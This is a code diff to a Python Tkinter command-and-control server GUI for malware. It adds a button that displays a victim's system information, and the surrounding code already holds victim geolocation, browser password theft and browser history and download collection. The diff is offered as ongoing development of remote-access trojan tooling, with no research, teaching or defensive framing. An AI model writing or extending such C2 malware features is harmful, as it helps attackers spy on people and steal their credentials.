@@ -399,6 +399,8 @@ class C2ServerGUI:
             {
                 "title": "Info Gatherer",
                 "commands": [
+                    {"text": "System info", "desc": "Show system information", 
+                     "command": self.show_system_info, "var_name": "system_info_btn"},
                     {"text": "Location", "desc": "Show geographical location on map", 
                      "command": self.show_victim_location, "var_name": "location_btn"}
                 ]
@@ -563,6 +565,40 @@ class C2ServerGUI:
                 self.log(f"Geolocation failed for {victim_ip}: {e}", "error")
 
         threading.Thread(target=geolocate_and_show, daemon=True).start()
+
+    def show_system_info(self):
+        try:
+            info = self.client_info
+            
+            if info:
+                self.log("System info retrieved", "success")
+                
+                # Create window
+                info_window = tk.Toplevel(self.root)
+                info_window.title("System Information")
+                info_window.geometry("600x400")
+                
+                # Create scrolled text widget
+                text_widget = scrolledtext.ScrolledText(
+                    info_window,
+                    wrap=tk.WORD,
+                    font=("Consolas", 10),
+                    padx=10,
+                    pady=10
+                )
+                text_widget.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
+
+                
+                text_widget.insert("1.0", info)
+                text_widget.config(state=tk.DISABLED)
+                
+            else:
+                self.log("No system info found", "info")
+                messagebox.showinfo("No system info found", "No system info found")
+                
+        except Exception as e:
+            self.log(f"System info error: {e}", "error")
+            messagebox.showerror("Error", f"Failed to retrieve system info:\n{e}")
 
     def get_browser_passwords(self):
         try:
@@ -742,6 +778,7 @@ class C2ServerGUI:
         self.browser_pass_btn.config(state=tk.NORMAL)
         self.browser_history_btn.config(state=tk.NORMAL)
         self.browser_dl_btn.config(state=tk.NORMAL)
+        self.system_info_btn.config(state=tk.NORMAL)
         
         
     def _disable_commands(self):
@@ -754,6 +791,7 @@ class C2ServerGUI:
         self.browser_pass_btn.config(state=tk.DISABLED)
         self.browser_history_btn.config(state=tk.DISABLED)
         self.browser_dl_btn.config(state=tk.DISABLED)
+        self.system_info_btn.config(state=tk.DISABLED)
         
         
     def stop_server(self):
